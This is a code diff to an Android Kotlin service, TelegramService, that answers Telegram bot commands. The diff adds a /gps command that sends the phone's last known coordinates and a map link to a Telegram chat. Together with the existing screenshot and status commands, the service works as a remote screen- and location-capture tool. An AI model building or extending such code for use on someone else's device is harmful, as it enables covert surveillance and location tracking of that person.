@@ -15,19 +15,20 @@ import android.hardware.display.VirtualDisplay
 import android.media.ImageReader
 import android.media.projection.MediaProjection
 import android.media.projection.MediaProjectionManager
+import android.location.LocationManager
 import android.os.Build
 import android.os.IBinder
 import android.util.DisplayMetrics
-import android.view.WindowManager
 import android.util.Log
+import android.view.WindowManager
 import androidx.core.app.NotificationCompat
 import kotlinx.coroutines.*
 import okhttp3.MediaType.Companion.toMediaTypeOrNull
 import okhttp3.MultipartBody
 import okhttp3.OkHttpClient
 import okhttp3.Request
-import okhttp3.RequestBody.Companion.toRequestBody
 import okhttp3.RequestBody.Companion.asRequestBody
+import okhttp3.RequestBody.Companion.toRequestBody
 import org.json.JSONObject
 import android.os.BatteryManager
 
@@ -169,6 +170,9 @@ class TelegramService : Service() {
             cmd.contains("/status") || cmd == "status" -> {
                 getDeviceStatus(targetChatId)
             }
+            cmd.contains("/gps") || cmd == "gps" || cmd == "location" -> {
+                getLocation(targetChatId)
+            }
             cmd.contains("/help") || cmd == "help" || cmd == "?" -> {
                 sendHelp(targetChatId)
             }
@@ -185,6 +189,7 @@ class TelegramService : Service() {
             /screenshot - ambil layar ponsel
             /battery  - level baterai
             /status   - info perangkat
+            /gps      - dapatkan lokasi GPS
             /help     - daftar ini
         """.trimIndent()
         sendText(chatId, helpText)
@@ -228,8 +233,32 @@ class TelegramService : Service() {
         val scale = i.getIntExtra(BatteryManager.EXTRA_SCALE, 1)
         val pct = if (level > 0 && scale > 0) level * 100 / scale else 0
         val status = i.getIntExtra(BatteryManager.EXTRA_STATUS, -1)
-        val charging = status == 2 || status == 5 // BatteryManager.STATUS_CHARGING, STATUS_FULL
+        val charging = status == 2 || status == 5
         return Pair(pct, charging)
+    }
+
+    private suspend fun getLocation(chatId: String) {
+        try {
+            val lm = getSystemService(LOCATION_SERVICE) as LocationManager
+            var location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
+            if (location == null) {
+                location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
+            }
+            if (location != null) {
+                val msg = buildString {
+                    append("📍 Lokasi:\n")
+                    append("Lat: ${\"%.5f\".format(location.latitude)}\n")
+                    append("Lng: ${\"%.5f\".format(location.longitude)}\n")
+                    append("Akurasi: ${\"%.1f\".format(location.accuracy)}m\n\n")
+                    append("https://maps.google.com/?q=${\"%.5f\".format(location.latitude)},${\"%.5f\".format(location.longitude)}")
+                }
+                sendText(chatId, msg)
+            } else {
+                sendText(chatId, "GPS belum aktif / tidak ada lokasi terakhir. Pastikan GPS ON.")
+            }
+        } catch (e: Exception) {
+            sendText(chatId, "Gagal ambil GPS: " + e.message)
+        }
     }
 
     private suspend fun getDeviceStatus(chatId: String) {
